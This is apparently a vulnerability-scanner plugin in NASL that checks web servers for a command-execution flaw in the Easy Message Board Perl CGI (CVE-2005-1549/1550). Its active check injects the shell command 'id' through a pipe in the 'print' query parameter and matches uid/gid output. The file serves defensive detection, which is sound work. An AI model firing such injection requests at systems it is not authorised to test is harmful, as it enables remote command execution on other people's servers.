# SPDX-FileCopyrightText: 2005 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.18211");
  script_version("2023-08-03T05:05:16+0000");
  script_tag(name:"last_modification", value:"2023-08-03 05:05:16 +0000 (Thu, 03 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2005-1549", "CVE-2005-1550");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/13551");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/13555");
  script_name("Easy Message Board Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"The remote host is running Easy Message Board, a bulletin board system
  written in perl.

  The remote version of this script contains an input validation flaw.");

  script_tag(name:"impact", value:"This flaw may be used by an attacker to perform a directory traversal attack
  or execute arbitrary commands on the remote host with the privileges of
  the web server.");

  script_tag(name:"solution", value:"Upgrade to the newest version of this CGI or disable it");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

http_check_remote_code(
                        check_request:"/easymsgb.pl?print=|id|",
                        extra_check:"<fint color=Blue>uid=[0-9]+.*gid=[0-9]+.*</b></font>",
                        check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                        command:"id"
                        );

exit( 99 );
